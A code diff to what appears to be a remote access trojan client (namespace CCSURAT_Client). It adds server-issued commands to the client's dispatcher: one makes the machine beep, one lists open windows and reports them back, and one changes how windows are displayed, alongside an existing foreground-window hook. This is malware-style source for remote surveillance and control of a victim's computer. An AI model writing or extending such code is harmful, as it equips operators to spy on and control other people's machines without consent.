@@ -50,6 +50,7 @@ namespace CCSURAT_Client
             this.serverIP = IP;
             this.serverPort = port;
             SetStatus("Disconnected.");
+
             dele = new WinEventDelegate(WinEventProc);
             IntPtr m_hhook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, IntPtr.Zero, dele, 0, 0, WINEVENT_OUTOFCONTEXT);
 
@@ -212,6 +213,16 @@ namespace CCSURAT_Client
                         break;
                     case "MONITORS":
                         Write("[[MONITORS]]" + SystemUtils.GetMonitors() + "[[/MONITORS]]");
+                        break;
+                    case "PIANO":
+                        SystemUtils.Beep(Convert.ToInt32(prms[0]), Convert.ToInt32(prms[1]));
+                        break;
+                    case "WINDOWS":
+                        Write("[[WINDOWS]]" + SystemUtils.GetWindows() + "[[/WINDOWS]]");
+                        break;
+                    case "WINDOW":
+                        for(int i = 0; i < prms.Length-2; i += 2)
+                            SystemUtils.ChangeWindowView(prms[i], prms[i+1]);
                         break;
                 }
             } catch(Exception ex)
